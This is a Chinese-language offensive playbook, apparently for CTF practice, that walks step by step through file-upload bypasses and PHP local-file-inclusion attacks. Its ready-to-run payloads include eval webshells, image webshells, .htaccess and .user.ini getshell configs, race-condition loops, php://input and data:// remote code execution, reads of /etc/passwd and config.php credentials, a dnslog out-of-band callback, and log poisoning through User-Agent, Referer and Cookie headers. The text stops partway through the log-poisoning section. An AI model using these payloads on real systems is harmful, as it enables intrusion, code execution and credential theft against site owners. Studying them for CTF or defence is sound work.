## [g-upload] 文件上传——黑名单、内容检测到配置型 Getshell 的完整绕过链

### [upload-blacklist] 黑名单绕过：畸形后缀与解析漏洞配合 | easy | 文件上传;黑名单;解析漏洞 | -
> 服务端仅按后缀黑名单拦截时，用畸形扩展名或解析器特性把 PHP 代码落地执行。

#### 这个条目的作用
当上传接口只做了"后缀黑名单"过滤（比如拦截 `.php`、`.jsp` 这类危险后缀）时，我们用畸形扩展名、大小写、双写、尾随字符这些"合法文件名"骗过过滤器，让文件落地后仍被 Web 服务器当作 PHP 解析执行。这一条教你从"被拦截"走到"webshell 上线"的完整判断链。

#### 前置条件
- 目标存在一个文件上传接口，且上传后的文件能通过 URL 直接访问（比如落在 `uploads/` 目录）
- 服务端过滤是"黑名单"而不是"白名单"（怎么区分见第 1 步）
- 你知道或能猜出上传后的访问路径（响应里常会返回，否则按 `uploads/`、`static/`、`files/` 逐个猜）

#### 第 1 步：确认过滤方式（黑名单还是白名单）
操作：用 Burp Repeater 或 curl 先传一个最普通的 `shell.php`，内容随便写点 PHP，观察响应。
```bash
curl -s -F 'file=@shell.php' 'http://t/upload.php'
```
- 预期结果：响应提示"后缀不允许 / 文件类型不合法"之类的报错 → 是过滤在拦你。
- 如果不行：响应直接说"只允许 jpg/png/gif" → 这是**白名单**，本条目方案基本失效，转 `upload-content`（图片马）。
- 关键判断：报错里如果提到了具体的危险后缀列表（php、php3、asp…），说明是黑名单，继续往下走。

#### 第 2 步：大小写绕过
操作：把后缀改成大写/混合大小写再传。
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data

-----------------------------boundary
Content-Disposition: form-data; name="file"; filename="shell.PhP"
Content-Type: application/x-php

<?php @eval($_POST['x']);?>
-----------------------------boundary--
```
- 预期结果：如果过滤正则没加 `i` 修饰符（不区分大小写），这次就成功了，直接跳到第 5 步验证执行。
- 如果不行：说明过滤不区分大小写，继续试下一种。

#### 第 3 步：畸形后缀逐个试
操作：把文件名后缀换成 Apache/PHP 常见可执行后缀，一次传一个（Burp 里直接改 filename）。
| 后缀 | 说明 |
| --- | --- |
| `.php5 .phtml .pht .php3 .php4 .php7` | Apache + mod_php 环境下常见的可执行 PHP 后缀，黑名单常只写 `php` |
| `.PhP .pHp .PHP` | 大小写绕过 |
| `.php. .php 空格 .php%0a` | 尾随点/空格/换行，过滤后落盘文件名被系统裁剪仍映射 php |
| `.pphphp` | 过滤把 `php` 替换为空时，双写后剩 `.php` |
| `.php%00.jpg` | 空字节截断（仅老版本，见 warn） |
- 预期结果：某个后缀不再报"不允许"，上传成功。
- 如果不行：全部后缀都拦 → 大概率是白名单或拦截所有带 php 特征的后缀，转 `upload-content`。

#### 第 4 步：双写与尾随字符绕过
操作：如果第 3 步里 `.pphphp` 没试过，单独试；再试带尾随点的 `shell.php.` 和带空格的 `shell.php `（Burp 里空格要写清楚，部分实现会 trim）。
- 预期结果：过滤逻辑若是"把 `php` 替换为空"，`shell.pphphp` 替换后变成 `shell.php`，落盘即成功。
- 如果不行：说明过滤是"直接拒绝含 php 字样"，双写无意义，回到第 3 步的畸形后缀。

#### 第 5 步：验证解析器（先探测再上马）
操作：别急着上马。先传一个内容只有 `<?php echo 123;?>` 的 `1.php.jpg`（任意后缀都行），然后访问它。
```bash
curl -s 'http://t/uploads/1.php.jpg'
```
- 预期结果：页面输出 `123` → 这个目录的解析器会执行 PHP，选一个成功上传的畸形后缀文件正式上马。
- 如果不行：页面原样输出代码或报 500 → 纯 Nginx + fastcgi 只把 `.php` 交给 PHP-FPM，畸形后缀不执行，改用 `upload-config` 的配置型方案或图片马 + LFI。

#### 第 6 步：解析漏洞配合（可选，老架构才有）
操作：如果上传成功但畸形后缀不执行，试这几个经典解析漏洞：
- **Apache 多后缀**：`shell.php.jpg` 从右往左匹配已知扩展名，老版本 httpd 2.2 + mod_php 会把整文件当 PHP 解析。
- **IIS 6.0 分号截断**：`shell.asp;.jpg`，分号后的内容被忽略（纯考古向，现代环境不用试）。
- **Nginx CGI 配置错误**：若 `fastcgi_param SCRIPT_FILENAME` 被固定写死到上传目录，`xxx.png` 也可能被解析——这种通常配合其他漏洞出现，先看目标指纹再判断。
- 预期结果：访问 `http://t/uploads/shell.php.jpg` 输出了 PHP 执行结果。
- 如果不行：解析漏洞依赖特定中间件版本，试不通就换条目。

#### 第 7 步：正式落地并连接
操作：把内容为 `<?php @eval($_POST['x']);?>` 的文件用第 2~4 步里成功的那款后缀上传，访问后用 POST 传参。
```bash
curl -s 'http://t/uploads/shell.php5' -d 'x=system("id");'
```
- 预期结果：返回 `id` 命令输出，webshell 可用。
- 如果不行：访问 404 → 上传目录/文件名猜错，先通过响应返回的路径或目录爆破定位真实路径。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 所有后缀都报"不允许" | 实际是白名单或黑名单覆盖全 | 转内容检测绕过（图片马） |
| 上传成功但访问 404 | 上传目录或文件名与访问路径不一致 | 看响应体返回路径；用报错/目录枚举定位 |
| 访问输出原样代码 | 解析器不认该后缀（纯 Nginx） | 改用 .user.ini 配置型或图片马+LFI |
| `.php%00.jpg` 不生效 | 空字节截断 PHP 5.3.4+ 已修复 | 别在 %00 上浪费时间，试双写/尾随字符 |

#### 实战要点
- 判断过滤方式永远第一步：黑名单有"无限种写法"可绕，白名单必须换思路。
- 上传后**先传 `<?php echo 1;?>` 验证解析，再上马**，避免在错误解析器上浪费 payload。
- `.phtml` `.pht` 在 Apache 上命中率最高，黑名单最常见漏网之鱼。
- 通配符拦 `php` 字样时，优先试大小写与双写，成本最低。
- 文件名被服务端随机改名时，后缀绕过基本失效，转配置型或图片马方案。

> [!tip] 上传后访问路径必须与脚本执行路径一致：`.php5` 在纯 Nginx + fastcgi 且只把 `.php` 交给 PHP-FPM 的站点上不执行。先传 `1.php.jpg` 内容 `<?php echo 1;?>` 访问验证解析器再走链。

> [!warn] 空字节截断 `%00` 在 PHP 5.3.4+ 与主流 Nginx 上已修复，别浪费请求；通配符挡不住就试大小写与双写。

### [upload-content] 内容检测绕过：图片马与合并 | medium | 文件上传;图片马;条件竞争 | -
> 白名单校验后缀与 MIME 时，把 PHP 代码藏进合法图片，再靠包含或解析漏洞触发。

#### 这个条目的作用
当上传接口升级成了"白名单"（只允许 jpg/png/gif）或检查了 MIME 类型、文件头时，黑名单那套后缀绕过就失效了。这一条教你：把 PHP 代码藏进一张"看起来完全合法"的图片里（图片马），再用包含漏洞或解析漏洞让图片里的代码执行，以及对抗二次渲染和条件竞争。

#### 前置条件
- 上传接口有后缀白名单 / MIME 检查 / 文件头检查（至少一项）
- 图片里的代码需要一个"执行出口"：LFI 包含参数、Apache 解析漏洞、或者 .htaccess（见 upload-config）——纯 Nginx 且无 LFI 时图片马无法直接执行
- 本地准备一张正常小图片（jpg/png/gif 均可）

#### 第 1 步：判断白名单到底查什么
操作：分别做三个测试，判断过滤维度：
```bash
# 测试 1：改 Content-Type，后缀保持 .jpg
curl -s -F 'file=@a.jpg;type=application/x-php;filename=a.jpg' 'http://t/upload.php'
# 测试 2：正常 jpg 正常 Content-Type（对照）
curl -s -F 'file=@a.jpg' 'http://t/upload.php'
```
- 预期结果：对照能上传成功 → 说明有白名单/校验存在；观察改 MIME 那次是否被拦。
- 如果不行：连正常 jpg 都被拦 → 可能是二次渲染/尺寸校验等更严格检查，看第 6 步。

#### 第 2 步：伪造 MIME 类型
操作：Burp 里把上传请求的 `Content-Type: image/jpeg` 改成图片对应的 MIME，后缀用 `.jpg`，内容直接是 PHP。
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data

-----------------------------boundary
Content-Disposition: form-data; name="file"; filename="shell.jpg"
Content-Type: image/jpeg

<?php @eval($_POST['x']);?>
-----------------------------boundary--
```
- 预期结果：若只查 MIME 不查内容，上传成功。
- 如果不行：说明还查了文件头/内容，转第 3 步。

#### 第 3 步：伪造文件头（GIF89a 大法）
操作：把代码放在 GIF 头之后，让文件头检查通过。
```txt
GIF89a
<?php @eval($_POST['x']);?>
```
- 预期结果：文件头校验通过，上传成功。
- 如果不行：若还要求文件是"可解码图片"（getimagesize 校验），单靠文本头不够，用第 4 步的真图片马。

#### 第 4 步：制作真图片马
操作：终端二选一，把代码拼到合法图片尾部。
```bash
# 方式一：直接追加（代码在文件尾，二进制不破坏）
echo '<?php @eval($_POST["x"]);?>' >> evil.jpg
# 方式二：copy 合并（更稳，推荐）
copy normal.jpg /b + shell.txt /b shell.jpg
```
- 预期结果：`file shell.jpg` 仍识别为 JPEG，图片能正常打开，尾部藏着 PHP 代码。
- 如果不行：图片预览/解码失败说明拼接破坏了结构，改用方式二或换更小的图片。

#### 第 5 步：触发执行（LFI 或解析漏洞）
操作：图片马自己不会执行，必须有出口。最常用的是配合 LFI：
```bash
# 目标存在 ?page= 包含参数时，直接包含图片
curl -s 'http://t/?page=uploads/shell.jpg'
# 或 Apache 多后缀解析（httpd 2.2 + mod_php）
curl -s 'http://t/uploads/shell.jpg'
```
- 预期结果：LFI 包含时图片里的 `<?php` 被当 PHP 执行；或解析漏洞环境下直接访问即执行。
- 如果不行：既无 LFI 也无解析漏洞 → 代码永远不执行，转 `upload-config` 配置型 Getshell。

#### 第 6 步：对抗二次渲染
操作：如果上传成功后图片被 GD/Imagick 重绘，尾部的代码被抹掉——检查方法是下载上传后的图片对比本地文件，字节数变短/内容变化即中招。
```bash
# 用 exiftool 把代码写进 EXIF 注释，找不重写元数据的渲染点
exiftool -Comment='<?php @eval($_POST["x"]);?>' shell.jpg
```
- 预期结果：重绘后 EXIF 注释仍在，包含时执行成功。
- 如果不行：渲染点重写元数据 → 用纯色图片最小化改动，逐字节二分定位"保留区"把代码塞进去（费时，最后手段）。

#### 第 7 步：条件竞争（文件先落盘后校验）
操作：某些实现是"先保存到磁盘 → 再校验 → 不合规就删除"，且文件名可预测（如 `t.php`、`时间戳.php`）。两个终端并发打：
```bash
# 终端 A：疯狂上传
while true; do curl -s -F 'file=@t.php' 'http://t/upload.php' -o /dev/null; done
# 终端 B：疯狂访问，抢在删除前执行
while true; do curl -s 'http://t/uploads/t.php?c=id'; done
```
- 预期结果：终端 B 某次返回了 `id` 命令输出 → 竞态窗口命中。
- 如果不行：文件名不可预测（随机名）或校验先于落盘 → 条件竞争不可行，放弃。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 上传成功但代码不执行 | 无 LFI/解析漏洞出口 | 找包含参数，或走 .htaccess/.user.ini |
| 代码在二进制垃圾中间报语法错 | 代码位置不对 | 代码放文件头之后、垃圾之前；或 copy 合并 |
| 下载后文件字节变短 | 被二次渲染重绘 | exiftool 写元数据 / 找保留区 |
| 图片上传后被删除 | 先落盘后校验 | 条件竞争并发访问 |

#### 实战要点
- 白名单 ≠ 安全：白名单校验的是"文件长得像不像图片"，不是"里面有没有代码"。
- 图片马必须搭配执行出口（LFI/解析/配置型），先确认出口存在再花时间做马。
- `copy normal.jpg /b + shell.txt /b shell.jpg` 是二进制安全的标准合并姿势，比 echo 追加更稳。
- 条件竞争只在"文件名可预测 + 先落盘后删"时可行，别在随机文件名上浪费时间。
- 代码放文件头部之后最安全，避免被二进制垃圾截断导致语法错误。

> [!tip] 触发不了解析就找 LFI：`?page=uploads/shell.jpg` 直接包含时，图片里的 `<?php` 会被当 PHP 执行。

> [!warn] 图片马里的代码若在二进制垃圾中间会语法报错，尽量把代码放在文件头之后、垃圾之前。

### [upload-config] 配置型 Getshell：.htaccess 与 .user.ini | medium | 文件上传;.htaccess;.user.ini | -
> 上传目录允许写入配置文件时，靠 Apache/Nginx 指令把任意后缀文件变成可执行 PHP。

#### 这个条目的作用
当后缀绕过和图片马都不好使（纯 Nginx 无解析漏洞、无 LFI）时，还有一条路：直接上传**配置文件**。Apache 认 `.htaccess`、Nginx+PHP-FPM 认 `.user.ini`，一旦上传目录能写入这两种文件，你就可以用配置指令把"任意后缀的普通文件"变成"会被当 PHP 执行的脚本"，从而 getshell。这是上传漏洞里最优雅也最常见的一种打法。

#### 前置条件
- 上传接口允许（或能通过畸形命名骗过）写入**点开头的文件**：`.htaccess` / `.user.ini`
- Apache 场景需要 `AllowOverride All` 才解析 `.htaccess`（很多 CTF 靶机默认开）
- `.user.ini` 场景需要 PHP 跑在 CGI/FPM 模式且版本 ≥ 5.3（现代靶机基本满足）；mod_php 模式不生效
- 能上传第二个文件作为"被配置的脚本"

#### 第 1 步：探测能否写配置文件
操作：直接传一个内容无关紧要的 `.htaccess`（Apache）或 `.user.ini`（Nginx）看是否被拦。
```bash
echo '# test' > .htaccess
curl -s -F 'file=@.htaccess' 'http://t/upload.php'
```
- 预期结果：上传成功，且用 `curl 'http://t/uploads/.htaccess'` 能读到内容 → 配置文件可落地，走第 2 步。
- 如果不行：报"文件类型不允许"或点开头文件被重命名 → 看是否只挡了黑名单后缀（`.htaccess` 常被漏掉）；若连点开头都重命名，配置型失效，回后缀绕过。

#### 第 2 步：上传恶意 .htaccess（方案一：AddType 全量映射）
操作：把 `.htaccess` 内容写成：
```apache
AddType application/x-httpd-php .jpg
```
- 预期结果：上传成功（内容无所谓，服务端一般只查后缀）。
- 如果不行：`.htaccess` 上传被拦，试 `.user.ini` 分支（第 5 步）。

#### 第 3 步：上传被配置的"马"并验证
操作：再传一个内容为 PHP 的 `shell.jpg`，访问验证。
```bash
# shell.jpg 内容：<?php @eval($_POST['x']);?>
curl -s 'http://t/uploads/shell.jpg' -d 'x=system("id");'
```
- 预期结果：`AddType` 已让 `.jpg` 走 PHP 处理器，访问返回 `id` 输出。
- 如果不行：返回原样代码 → `.htaccess` 没生效（`AllowOverride` 未开），验证方式见常见错误表。

#### 第 4 步：更稳的 FilesMatch 定向方案
操作：如果全量映射被环境限制，改用只针对特定文件名的处理器指令，规避部分安全配置：
```apache
<FilesMatch "shell">
  SetHandler application/x-httpd-php
</FilesMatch>
```
再上传 `shell.jpg`（内容为 PHP）。访问 `http://t/uploads/shell.jpg` 验证。
- 预期结果：文件名含 `shell` 的文件被强制按 PHP 解析。
- 如果不行：还是原样输出，确认目标确实是 Apache 且开了 AllowOverride。

#### 第 5 步：.user.ini 方案（Nginx + PHP-FPM）
操作：先确认目标可能是 Nginx（响应头 `Server: nginx`），上传 `.user.ini`，内容：
```ini
auto_prepend_file=shell.jpg
```
- 预期结果：上传成功。PHP 对每个目录只认一个 `.user.ini`（已存在时内容合并/覆盖，先读一下现有内容避免破坏）。
- 如果不行：目标若报 PHP 版本 < 5.3 或非 FPM/CGI 模式，此方案不生效。

#### 第 6 步：触发预包含
操作：上传内容为 `<?php system($_GET["c"]);?>` 的 `shell.jpg`，然后访问**同目录下任意一个真实存在的 .php 文件**。
```bash
curl -s 'http://t/upload/index.php?c=id'
```
- 预期结果：`auto_prepend_file` 让每个 PHP 请求在开头自动包含 `shell.jpg`，`index.php` 的响应里带出 `id` 输出（即使 index.php 本身是空页面）。
- 如果不行：若该目录没有任何 .php 文件，预包含无从触发；可配合目录里自带的 php 文件（如 `index.php`、`upload.php`）或用后缀绕过先放一个 `.php` 进去。

#### 第 7 步：确认失效条件，及时换路
操作：测试两个关键点——上传目录里能否访问到 `.user.ini` 内容；文件是否被随机改名。
```bash
curl -s 'http://t/uploads/.user.ini'
```
- 预期结果：能读到内容 → 配置生效路径没问题。
- 如果不行：若系统把上传文件随机改名并放独立目录，`.user.ini` 的相对路径就找不到 `shell.jpg`，配置型姿势整体失效 → 回退到解析漏洞或图片马 + LFI。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| .htaccess 上传成功但访问 jpg 不执行 | AllowOverride 未开 / Nginx 不解析 | 确认 Server 头是 Apache；换 .user.ini |
| .user.ini 不触发 | mod_php 模式或目录无 .php 文件 | 确认 FPM/CGI；先放一个 .php 进去 |
| 访问 .user.ini 返回 404 | 点开头文件被隐藏/重命名 | 配置型失效，转图片马+LFI |
| shell.jpg 被随机改名 | 服务端重命名上传文件 | 配置型失效（相对路径断裂），转其他方案 |

#### 实战要点
- 先探测"能不能传点开头文件"再谈配置型 getshell；很多过滤只写死常见后缀，`.htaccess` 是漏网之鱼。
- `.htaccess` 只在 Apache + `AllowOverride All` 生效，Nginx 完全忽略它——看响应头 `Server` 决定走哪条分支。
- `.user.ini` 的 `auto_prepend_file` 是相对路径，相对于 `.user.ini` 所在目录，马必须传同一目录。
- 触发预包含必须访问**真实存在的 .php 文件**，空目录里配置了也触发不了。
- 上传文件被随机改名+独立目录时，所有配置型姿势断裂，回退解析漏洞或图片马。

> [!tip] 先探测配置机会：能传 `.htaccess`/`.user.ini`（常见重命名过滤漏掉点开头文件）再谈 getshell；传不进去就回到后缀绕过。

> [!warn] 若系统把上传文件随机改名并放独立目录，上述配置类姿势失效，优先找解析漏洞或图片马+LFI。

## [g-lfi] 文件包含——filter 读源码、伪协议执行到日志投毒

### [lfi-filter] php://filter 读源码 | easy | 文件包含;php://filter;源码泄露 | -
> 可控参数被 include 时，用 php://filter 流以 base64 编码读回源码，绕开"文件被当 PHP 执行"。

#### 这个条目的作用
当 `?page=xxx` 这类参数被 `include` 进 PHP 时，如果你直接让它读 `index.php`，代码会被**当成 PHP 执行**而不是打印出来，你什么也看不到。`php://filter` 流可以在读取文件内容时先做一次 base64 编码再返回，PHP 执行的是"编码后的字符串"（不含 `<?php`），于是源码原样吐出来。这是 LFI 的第一课：**先读源码，再谈利用**。

#### 前置条件
- 目标存在参数被 `include`/`require`/`file_get_contents` 等文件操作函数处理
- 能用相对路径或绝对路径定位到目标文件（`index.php` 通常就在工作目录）
- 不用在意 `allow_url_include`——filter 是本地流，不需要开启

#### 第 1 步：确认包含参数
操作：浏览器或 curl 传一个存在的页面名，观察行为。
```bash
curl -s 'http://t/?page=index.php'
```
- 预期结果：页面正常渲染（说明参数确实被包含），或出现 PHP 报错（`include(): Failed opening ...`，反而直接泄露了包含路径）。
- 如果不行：访问报"找不到文件"且换 `page=1.txt` 之类也没反应 → 参数可能不是文件包含，先确认功能点。

#### 第 2 步：裸读探测文件是否存在
操作：用 filter 但不编码，直接读，看是否有内容/报错差异。
```bash
curl -s 'http://t/?page=php://filter/resource=index.php'
```
- 预期结果：返回了 index.php 被"执行后"的输出（乱码/空白/报错都算），说明文件存在、filter 可用。
- 如果不行：完全无输出且无报错 → 试 `resource=./index.php` 或绝对路径 `/var/www/html/index.php`；仍不行则路径层级不对，看第 5 步。

#### 第 3 步：base64 编码读源码
操作：加上 `read=convert.base64-encode` 过滤器。
```bash
curl -s 'http://t/?page=php://filter/read=convert.base64-encode/resource=index.php'
```
- 预期结果：返回一长串 base64 字符（`PD9waHA...`），这就是源码的编码形态——因为不含 `<?php` 字样，不会被当作 PHP 执行。
- 如果不行：返回空 → 试 `php://filter/convert.base64-encode/resource=index.php`（省略 read= 写法）或换路径层级。

#### 第 4 步：解码还原源码
操作：终端里把上一步的输出接给 base64 解码。
```bash
curl -s 'http://t/?page=php://filter/read=convert.base64-encode/resource=config.php' | base64 -d
```
- 预期结果：终端直接打印出 `config.php` 的明文源码，里面常直接躺着数据库账号密码或 flag。
- 如果不行：base64 串中间有换行/截断导致解码失败 → 去掉响应里的 HTML 杂质，或 `base64 -d` 前先 `tr -d '\n'`。

#### 第 5 步：用 ../ 跨目录定位文件
操作：读不到时调整相对路径层级，配合绝对路径试。
```bash
curl -s 'http://t/?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd'
curl -s 'http://t/?page=php://filter/convert.base64-encode/resource=/etc/passwd'
```
- 预期结果：`/etc/passwd` 解出来是系统账户列表 → 路径层级正确；然后同理去读 `flag`、`config.php`。
- 如果不行：读不到可能是包含了路径前缀（如 `pages/` 被拼在参数前面），多试几层 `../`，或用报错信息里的真实路径反推。

#### 第 6 步：filter 变体（绕过内容过滤）
操作：如果目标对读到的内容做了关键字过滤（拦 base64 字样），换变体：
| 链 | 用途 |
| --- | --- |
| `php://filter/read=string.rot13/resource=index.php` | 明文经 rot13 混淆，绕过对明文关键字的过滤 |
| `php://filter/read=convert.base64-decode|convert.base64-encode/resource=index.php` | 多层链式，绕过内容扫描 |
| `php://filter/read=zlib.deflate|convert.base64-encode/resource=index.php` | 压缩流混淆、读大文件 |
- 预期结果：某种变体返回可解码内容。
- 如果不行：所有 filter 都失败 → 参数可能被 `htmlspecialchars` 等转义，或过滤白名单只放行 `page=数字`，先看报错判断。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 返回空或 500 | 路径层级不对/文件不存在 | 加 `../` 层级、试绝对路径、裸读探活 |
| 解码后是乱码 | base64 串混入 HTML/换行 | 先 `tr -d '\n'` 再解码 |
| 读到的是执行结果不是源码 | 忘了加编码过滤器 | 必须带 `convert.base64-encode` |
| 输出被关键字过滤 | 服务端扫描明文 | 用 rot13 / zlib / 链式过滤器 |

#### 实战要点
- LFI 第一步永远是 filter 读源码：源码里有包含路径、过滤逻辑、数据库配置，能指导后续所有步骤。
- `resource=` 相对路径按服务端工作目录推断，`../` 层级宁多勿少，配合绝对路径双保险。
- base64 输出为空不等于文件不存在，先裸读（不编码）判断是"存在但读不了"还是"根本不存在"。
- 读到的源码立刻找：`include`/`require` 的其他文件、数据库配置、flag 路径。
- filter 是本地协议，不依赖 `allow_url_include`，现代环境 100% 可用，是 LFI 最稳定的姿势。

> [!tip] 相对路径按服务端工作目录推断，配合 `../` 定位：`php://filter/convert.base64-encode/resource=../../../../etc/passwd`。

> [!warn] base64 输出里若是空或报错，试试换 `resource=../` 层级、加绝对路径，或先 `php://filter/resource=...` 裸读判断文件是否存在。

### [lfi-input] php://input 与 data:// 直接执行 | medium | 文件包含;php://input;data:// | -
> 允许远程流时，php://input 把 POST 体当 PHP 执行，data:// 把代码内联进 URL。

#### 这个条目的作用
`php://filter` 只能"读"，当你想直接"执行代码"时，需要 `php://input` 或 `data://` 这两个伪协议：前者把 POST 请求体当作 PHP 源码执行（适合长 payload），后者把代码直接内联在 URL 里（适合短探测）。两个协议都要求 `allow_url_include=On`，所以第一步永远是判断这个开关是否打开。

#### 前置条件
- 已确认存在 LFI 参数（`?page=` 被 include）
- `allow_url_include=On`（默认 Off，需要先验证）
- 知道 PHP 版本大致情况（老版本 PHP 5.x 默认开，PHP 7+ 默认关）

#### 第 1 步：判断 allow_url_include 是否开启
操作：三种探测方式，按优先级：
```bash
# 方式一：有 phpinfo 页面直接搜
curl -s 'http://t/phpinfo.php' | grep -i allow_url_include
# 方式二：页面报错泄露配置（访问一个远程 URL 看报错文案）
curl -s 'http://t/?page=http://127.0.0.1/'
# 方式三：直接盲试（见第 2 步），成功即开
```
- 预期结果：phpinfo 显示 `allow_url_include On`；或访问远程 URL 报错"Only local files shall be considered"（说明被禁）/"failed to open stream"（说明尝试连接，即开着）。
- 如果不行：全部探测无结果 → 直接跳到第 2 步用最小 payload 实测，成功与否一目了然。

#### 第 2 步：php://input 执行
操作：把 PHP 代码放进 POST 体，参数指向 `php://input`。
```bash
curl -s -d '<?php system($_GET["c"]);?>' 'http://t/?page=php://input&c=id'
```
- 预期结果：返回 `id` 命令输出 → `allow_url_include` 开启，直接 RCE。
- 如果不行：返回空或报"Failed to open stream" → 开关关闭，php://input 不可用，别硬试，转回 filter 读源码路线。

#### 第 3 步：data:// 明文执行（短探测）
操作：代码直接放 URL 里（注意把 `<` `>` 等特殊字符 URL 编码，curl 会自动处理一部分）。
```bash
curl -s 'http://t/?page=data://text/plain,<?php echo 1;?>'
```
- 预期结果：页面输出 `1` → data:// 可用，且证明代码执行。
- 如果不行：输出原样 `<?php echo 1;?>` 或报错 → 看是否被转义，换 base64 版（第 4 步）。

#### 第 4 步：data:// base64 编码版（更稳）
操作：代码先 base64，用 `;base64,` 形式内联，规避特殊字符与关键字过滤。
```bash
# PD9waHAgZWNobyAxOz8+ 解码为 <?php echo 1;?>
curl -s 'http://t/?page=data://text/plain;base64,PD9waHAgZWNobyAxOz8+'
curl -s 'http://t/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg&c=id'
```
（第二行 payload 解码为 `<?php system($_GET[c]);?>`，注意 `$_GET[c]` 里 `[c]` 的引号在 base64 里无需转义，URL 传参时 `&c=id` 正常拼接。）
- 预期结果：输出 `1` / `id` 执行结果。
- 如果不行：仍失败 → 确认 payload 的 base64 是否正确（本地 `echo '<?php echo 1;?>' | base64` 对照），以及 URL 中 `&` 是否被当成参数分隔符（payload 含 `&` 时需整体编码）。

#### 第 5 步：无回显时的带外确认
操作：页面完全无回显时，让执行的代码发起带外请求。
```bash
curl -s -d '<?php file_get_contents("http://xxx.dnslog.cn/".md5("probe"));?>' 'http://t/?page=php://input'
```
- 预期结果：dnslog 平台收到形如 `xxxx.dnslog.cn` 的解析记录 → 代码确实执行了，只是无回显。
- 如果不行：dnslog 无记录 → 代码没执行（开关关闭）或 `file_get_contents` 被禁，换 `system('curl http://xxx.dnslog.cn')` 类命令再试。

#### 第 6 步：三种协议组合排查顺序
操作：当不确定走哪条时，按顺序逐个试：
```bash
# 1) filter 读源码（必成，先拿信息）
curl -s 'http://t/?page=php://filter/convert.base64-encode/resource=index.php'
# 2) data:// 执行（短 payload 探测）
curl -s 'http://t/?page=data://text/plain;base64,PD9waHAgZWNobyAxOz8+'
# 3) php://input 执行（长 payload 上马）
curl -s -d '<?php system($_GET["c"]);?>' 'http://t/?page=php://input&c=id'
```
- 预期结果：filter 一定先给源码，源码里的 phpinfo/版本信息能告诉你 `allow_url_include` 是否可期。
- 如果不行：执行型全部失败 → 老实走日志投毒（lfi-rfi），那不需要 allow_url_include。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| php://input 无输出 | allow_url_include=Off | 不可用，转日志投毒/filter |
| data:// 输出原样代码 | URL 转义问题/开关关闭 | 换 base64 版；确认编码正确 |
| 带 & 的 payload 被截断 | & 被当参数分隔符 | payload 整体 base64 化 |
| 无回显不确定是否成功 | 代码执行但页面静默 | 带外 dnslog 确认 |

#### 实战要点
- 执行型伪协议**强依赖 allow_url_include**，先确认再投入；默认 Off 是现代环境常态。
- `php://input` 优于 `data://`：POST 体不受 URL 长度限制，适合长 payload（反弹 shell、写文件）。
- 读不到源码又执行不了时，逐个试：filter（读）→ data://（执行）→ php://input（执行），别跳步。
- 无回显一律上 dnslog 带外确认，避免"以为成功"。
- phpinfo 页面是黄金情报：`allow_url_include`、`disable_functions`、路径全部一次拿到。

> [!tip] filter 读不到源码而执行又不行时，逐个试：`php://filter`（读）→ `data://`（执行）→ `php://input`（执行，POST 体不受 URL 长度限制）。

> [!warn] `data://` 与 `php://input` 都要求 `allow_url_include=On`（默认 Off）；先看有无 phpinfo 或报错佐证再依赖执行型姿势。

### [lfi-rfi] 日志包含、Session 包含与远程包含 | hard | 文件包含;日志投毒;远程包含 | -
> 没有可直接包含的代码文件时，把 payload 写进日志/session/临时文件再包含，或远程包含恶意文件。

#### 这个条目的作用
当 filter 读不了、执行型伪协议又因 `allow_url_include` 关闭而不可用时，还有一个思路：**先写后读**。把 PHP 代码投毒到服务器上"你恰好能控制内容"的文件里——最常见的是 Web 访问日志（User-Agent 会被记录）、Session 文件、/proc 环境文件——然后用 LFI 去包含它，让日志里的代码被 PHP 执行。这就是日志投毒，是 LFI 到 RCE 最实用的路线。远程包含（RFI）现代环境基本不可用，只作了解。

#### 前置条件
- 存在可用的 LFI 参数（能包含本地文件）
- 知道（或能猜出）日志/Session 文件的绝对路径
- 能往日志里写入内容（发请求即可，UA/Referer/Cookie 都会被记录）
- 投毒文件里能否执行代码不依赖 allow_url_include（本地包含永远允许）

#### 第 1 步：定位日志文件路径
操作：先尝试让报错泄露路径，或按常见路径表试。
```bash
# 方式一：触发 include 报错，报错里会带绝对路径
curl -s 'http://t/?page=../../../../etc/nonexist'
# 方式二：直接按常见路径包含探测
curl -s 'http://t/?page=../../../../var/log/apache2/access.log'
curl -s 'http://t/?page=../../../../var/log/nginx/access.log'
```
常用日志路径：
- `/var/log/apache2/access.log`（Debian/Ubuntu）、`/usr/local/apache/logs/access_log`（编译安装）
- `/var/log/nginx/access.log`、`/var/log/nginx/error.log`
- 预期结果：页面输出日志内容（哪怕一堆请求记录）→ 路径正确，进入第 2 步。
- 如果不行：路径全错 → 用 filter 读 `/etc/apache2/apache2.conf` 或 nginx.conf 找 `CustomLog`/`access_log` 指令拿真实路径；或看报错泄露。

#### 第 2 步：投毒——把代码写进 User-Agent
操作：发一个 UA 带 PHP 代码的请求，让日志记录下这段代码。
```bash
curl -s -A '<?php system($_GET["c"]);?>' 'http://t/?page=1'
```
- 预期结果：日志里多了一行 UA 为 `<?php system($_GET["c"]);?>` 的记录（用第 1 步的包含方式先确认能看到）。
- 如果不行：UA 内容被 URL 编码存储（日志里是 `%3C?php`）→ 见第 4 步处理编码问题。

#### 第 3 步：包含日志触发执行
操作：访问 LFI 参数指向日志文件，并带上 `c` 参数。
```bash
curl -s 'http://t/?page=../../../../var/log/apache2/access.log&c=id'
```
- 预期结果：响应里输出 `id` 命令结果 → 日志投毒成功，LFI 升级为 RCE。
- 如果不行：输出原样 `<?php system(...);?>`（说明被转义/编码，见第 4 步），或 PHP 语法报错（日志里其他行污染了代码上下文）→ 用 `php://filter` 读日志确认存储形态。

#### 第 4 步：处理日志编码问题
操作：若日志把 UA 存成 `%3C?php...` 形态，试三种投毒变体：
```bash
# 变体一：投到 Referer（部分服务器不编码）
curl -s -e '<?php system($_GET["c"]);?>' 'http://t/?page=1'
# 变体二：投到 Cookie
curl -s -b 'PHPSESSID=<?php system($_GET["c"]);?>' 'http://t/?page=1'
# 变体三：同时投 UA 与 Referer，总有一份是原样
curl -s -A '<?php system($_GET["c"]);?>' -e '<?php system($_GET["c"]);?>' 'http://t/?page=1'
```
